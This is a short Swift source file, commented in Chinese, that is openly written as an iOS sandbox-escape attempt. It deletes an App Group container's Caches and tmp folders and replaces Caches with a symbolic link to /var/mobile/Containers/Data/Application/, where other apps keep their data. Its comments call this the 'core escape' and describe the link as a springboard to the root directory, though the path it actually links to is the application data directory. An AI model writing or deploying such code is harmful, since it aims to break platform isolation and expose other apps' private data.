import Foundation

class WorseQuery {
    static func activate() {
        // 1. 获取你的 App Group 路径 (必须和你稍后在 project.yml 里配的一致)
        guard let groupURL = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: "group.com.chenxuanjian9.dsh") else {
            print("❌ 找不到 App Group")
            return
        }
        
        let cachesURL = groupURL.appendingPathComponent("Library/Caches")
        let tmpURL = groupURL.appendingPathComponent("tmp")
        
        // 2. 清理可能存在的旧文件
        try? FileManager.default.removeItem(at: cachesURL)
        try? FileManager.default.removeItem(at: tmpURL)
        
        // 3. 核心逃逸：创建符号链接指向根目录
        // 这样系统在检查沙盒时，会把这个 Group 容器当成根目录的跳板
        let targetPath = "/var/mobile/Containers/Data/Application/"
        do {
            try FileManager.default.createSymbolicLink(atPath: cachesURL.path, withDestinationPath: targetPath)
            print("✅ 逃逸成功！链接已建立在: \(cachesURL.path)")
        } catch {
            print("❌ 逃逸失败: \(error)")
        }
    }
}
